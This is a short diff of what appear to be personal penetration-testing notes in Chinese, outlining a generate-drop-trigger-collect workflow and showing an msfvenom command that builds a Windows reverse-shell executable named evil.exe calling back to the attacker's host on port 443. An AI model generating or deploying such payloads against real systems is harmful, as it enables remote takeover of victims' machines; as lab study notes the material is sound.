@@ -1,3 +1,4 @@
+WQs6nqCFbG8
 生 > 丟 > touch > 收 
 每次生成....'port'一定要改
 msfvenom -p windows/shell_reverse_tcp LHOST=自己 LPORT=443 -f exe > evil.exe
